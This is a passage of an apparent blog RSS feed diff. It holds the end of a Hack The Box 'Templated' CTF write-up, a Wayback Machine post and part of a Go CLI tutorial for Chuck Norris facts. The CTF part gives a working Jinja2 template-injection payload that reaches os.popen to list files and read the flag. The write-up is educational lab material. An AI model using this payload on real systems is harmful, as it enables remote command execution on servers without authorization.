+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__class__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__base__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__subclasses__()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/images/templated/templated5.png&#34; alt=&#34;text&#34;&gt;&lt;/p&gt;
+&lt;p&gt;*img: executing python code.&lt;/p&gt;
+&lt;p&gt;We parse through the subclasses listed in the above image and find the &amp;lt;class &amp;lsquo;warnings.catch_warnings&amp;rsquo;&amp;gt;. This subclass allows us to import the sys module and then later the os module. We can use some comma separated element parser to find the location of the &lt;code&gt;warnings&lt;/code&gt;(it is 186 in our case) class and then write our exploit as below:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__class__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__base__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__subclasses__()[&lt;span style=&#34;color:#ae81ff&#34;&gt;186&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__globals__[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sys&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;modules[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;popen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ls&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()}}n
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/images/templated/templated6.png&#34; alt=&#34;text&#34;&gt;&lt;/p&gt;
+&lt;p&gt;*img: We get the files listed by using the ls command.&lt;/p&gt;
+&lt;p&gt;Since we can see that there is a flag.txt present in the directory. We can just execute &lt;code&gt;cat flag.txt&lt;/code&gt; to get the flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__class__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__base__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__subclasses__()[&lt;span style=&#34;color:#ae81ff&#34;&gt;186&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__globals__[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sys&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;modules[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;popen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat flag.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()}}n
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;The flag is HTB{t***************************************!}&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Wayback Machine</title>
+      <link>/posts/waybackmachine/</link>
+      <pubDate>Fri, 13 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/waybackmachine/</guid>
+      <description>The Wayback Machine is a digital archive of the World Wide Web founded by the Internet Archive in the 1990s. The Internet Archive is a non profit organisation dedicated to preserving digital information for future generations.
+One of the most interesting things about the Wayback Machine is that it offers a glimpse into the past of the internet. By browsing through old versions of websites, we can see how they have evolved over time and observe how technology, design, and content have changed.</description>
+      <content>&lt;p&gt;The &lt;a href=&#34;https://web.archive.org/&#34;&gt;Wayback Machine&lt;/a&gt; is a digital archive of the World Wide Web founded by the &lt;a href=&#34;https://en.wikipedia.org/wiki/Internet_Archive&#34;&gt;Internet Archive&lt;/a&gt; in the 1990s. The Internet Archive is a non profit organisation dedicated to preserving digital information for future generations.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/wayback/wayback5.png&#34; alt=&#34;Wayback banner&#34;&gt;&lt;/p&gt;
+&lt;p&gt;One of the most interesting things about the Wayback Machine is that it offers a glimpse into the past of the internet. By browsing through old versions of websites, we can see how they have evolved over time and observe how technology, design, and content have changed. For example, you can see how a website like Google looked in the late 1990s and how it has changed since then. This is a valuable resource for anyone interested in the history of the internet, as it allows us to see how far we&amp;rsquo;ve come in terms of technology and design.&lt;/p&gt;
+&lt;p&gt;For example, there is a site &lt;a href=&#34;https://gangte.net&#34;&gt;gangte.net&lt;/a&gt; which is no longer active and the content is unaccessible at the moment. Since I want to read the contents that have been published in the site, I can utilise the wayback machine to see previous snapshots of the site taken.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Snapshots taken from May 7, 2013 to May 11, 2021&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/wayback/wayback1.png&#34; alt=&#34;Snapshots&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Let&amp;rsquo;s look at snapshot of the site on February 24, 2021&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/wayback/wayback2.png&#34; alt=&#34;FEB 24&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Home page of the site on February 24, 2021. We can see some interesting articles written on hacking.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/wayback/wayback3.png&#34; alt=&#34;Homepage&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;If it weren&amp;rsquo;t for the wayback machine, the content would have been lost to the world. Yet we are able to read the content.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/wayback/wayback4.png&#34; alt=&#34;How to become a hacker&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Another great use of the Wayback Machine is for research purposes. It can be incredibly helpful for historians, journalists, and other researchers looking to gain insight into the past. By being able to access old versions of websites, they can get a better understanding of how events and information were reported at the time. This can be particularly useful for understanding how different perspectives and narratives have changed over time.&lt;/p&gt;
+&lt;p&gt;Additionally, the Wayback Machine can also be useful for small business owners or other individuals who may have lost important information from a website. By using the Wayback Machine, they can access archived versions of the site and retrieve any lost information. This can be incredibly valuable for businesses that may have lost important data or content, as it allows them to retrieve it and continue operating as normal.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It&amp;rsquo;s worth noting that the Wayback Machine is not just limited to websites, it also archive other forms of digital media, such as image, audio, and video. This allows users to access a wide range of digital materials from the past, providing an even more comprehensive view of the history of the internet.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The Wayback Machine is also a valuable resource for those who are looking to improve their digital presence. By studying the design and content of older websites, businesses and individuals can learn from the mistakes and successes of the past in order to create a more effective online presence.&lt;/p&gt;
+&lt;p&gt;The Internet Archive, the organization that runs the Wayback Machine, is a non-profit organizatclion that relies on donations to operate. The organization&amp;rsquo;s mission is to archive the internet and to make it accessible to everyone. The Wayback Machine is just one of the many tools that the Internet Archive has created to achieve this goal. By preserving the internet&amp;rsquo;s history, the Internet Archive is helping to ensure that the digital information of the past is not lost forever.&lt;/p&gt;
+&lt;p&gt;Overall, the Wayback Machine is a valuable resource for anyone interested in the history of the internet. It offers a glimpse into the past and can be used for both personal and professional purposes. It&amp;rsquo;s a great tool for anyone looking to research, learn, or simply reminisce about the good old days of the web. Whether you&amp;rsquo;re a historian, journalist, business owner, or just someone who is curious about the past, the Wayback Machine is a valuable resource that is worth exploring.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Go Chuck Facts</title>
+      <link>/posts/gochuckfacts/</link>
+      <pubDate>Tue, 10 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/gochuckfacts/</guid>
+      <description>Go Chuck Facts is a Command Line Interface (CLI) created using the golang to fetch facts. Facts about the legend Mr. Chuck Norris are fetch from the api endpoint chucknorris.io.
+The CLI is created using only the standard libraries provided by the go language and is useful for fundamental understanding of how the language operates. The standard package is well documented and provides good information of how code are tied together and abstracted.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://github.com/nga1hte/go-chuck-facts&#34;&gt;Go Chuck Facts&lt;/a&gt; is a Command Line Interface (CLI) created using the golang to fetch facts. Facts about the legend Mr. Chuck Norris are fetch from the api endpoint &lt;a href=&#34;https://api.chucknorris.io&#34;&gt;chucknorris.io&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The CLI is created using only the standard libraries provided by the go language and is useful for fundamental understanding of how the language operates. The standard package is well documented and provides good information of how code are tied together and abstracted.&lt;/p&gt;
+&lt;h2 id=&#34;how-it-works&#34;&gt;How it Works&lt;/h2&gt;
+&lt;p&gt;Usage of the api endpoint is simple and provides a simple json of facts. The json can be easily parsed using &lt;code&gt;json/encoding&lt;/code&gt; package of go.&lt;/p&gt;
+&lt;p&gt;The endpoint can be accessed using:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl https://api.chucknorris.io/jokes/random 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The response from the endpoint:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;categories&amp;#34;&lt;/span&gt;: [],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;created_at&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2020-01-05 13:42:29.296379&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;icon_url&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://assets.chucknorris.host/img/avatar/chuck-norris.png&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Gg-KPU6qTgqlS7Mpk2feFg&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;updated_at&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2020-01-05 13:42:29.296379&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://api.chucknorris.io/jokes/Gg-KPU6qTgqlS7Mpk2feFg&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Camels have a hump because Chuck Norris needed a place to store his kills.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The CLI basically sends a &lt;code&gt;http:GET&lt;/code&gt; request to the endpoint and parses the &lt;code&gt;json&lt;/code&gt; to extract the value field and then displays it to the standard output.&lt;/p&gt;
+&lt;h2 id=&#34;the-project-structure&#34;&gt;The Project Structure&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;go-chuck-facts
+    |-- model
+    |      |-- fact.go
+    |-- client
+    |      |-- client.go
+    |-- gocf.go
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;model/fact.go&lt;/code&gt; contains the struct that will help parse the &lt;code&gt;json&lt;/code&gt; and extract value.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;client/client.go&lt;/code&gt; contains functions that will fetch and make http requests using the &lt;code&gt;net/http&lt;/code&gt; package&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gocf.go&lt;/code&gt; is contains &lt;code&gt;main()&lt;/code&gt; and is the entry point to the program. It utilise the &lt;code&gt;flag&lt;/code&gt; package to parse arguments from the &lt;code&gt;stdin&lt;/code&gt; of the terminal.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This project heavily relies on the blog post &lt;a href=&#34;https://dev.to/erybz/diving-into-go-by-building-a-cli-application-28k9&#34;&gt;Diving into go by building a cli application&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;modelfactgo&#34;&gt;model/fact.go:&lt;/h2&gt;
+&lt;p&gt;Since we are only interested in three fields of the &lt;code&gt;json&lt;/code&gt; we create a new datatype &lt;code&gt;Fact&lt;/code&gt; that will contain categories, URL and Value.&lt;/p&gt;
+&lt;p&gt;We also create a new struct which will contain an array of strings which we will later use to validate the options that are provided in the arguments.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//fact.go
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Fact&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Categories&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`json:&amp;#34;categories&amp;#34;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;URL&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;`json:&amp;#34;url&amp;#34;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Value&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;`json:&amp;#34;value&amp;#34;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;categories&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Values&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;The categories can be obtained from this endpoint.&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl https://api.chucknorris.io/jokes/categories
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[&amp;#34;animal&amp;#34;,&amp;#34;career&amp;#34;,&amp;#34;celebrity&amp;#34;,&amp;#34;dev&amp;#34;,&amp;#34;explicit&amp;#34;,&amp;#34;fashion&amp;#34;,&amp;#34;food&amp;#34;,&amp;#34;history&amp;#34;,&amp;#34;money&amp;#34;,&amp;#34;movie&amp;#34;,&amp;#34;music&amp;#34;,&amp;#34;political&amp;#34;,&amp;#34;religion&amp;#34;,&amp;#34;science&amp;#34;,&amp;#34;sport&amp;#34;,&amp;#34;travel&amp;#34;]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since categories are unlikely to change, it is a waste to fetch categories from the endpoint everytime. So we populate the categories struct with the values.
+We also create some helper methods that we will use to print the categories and also create a map which we will later use to validate the options.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//fact.go
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Categories&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;categories&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Values&lt;/span&gt;: []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;animal&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;career&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;celebrity&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dev&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;explicit&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fashion&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;food&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;history&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;money&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;movie&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;music&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;political&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;religion&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;science&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sport&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;travel&amp;#34;&lt;/span&gt;},
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;categories&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;PrintCategories&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strings&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Join&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Values&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;, &amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;categories&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;MapValues&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Values&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt;] = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;clientclientgo&#34;&gt;client/client.go&lt;/h2&gt;
+&lt;p&gt;We create a const to store the base url as well as use the time package to store a default timeout. We probably don&amp;rsquo;t want the client to keep waiting for slow response so a default timeout is required. We can request a new connection after the timeout.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;net/http&lt;/code&gt; package provides us with client and servers. We first create a &lt;code&gt;http.Client&lt;/code&gt; which will serve as a way to send http request with different parameters and headers.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// client.go
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; (
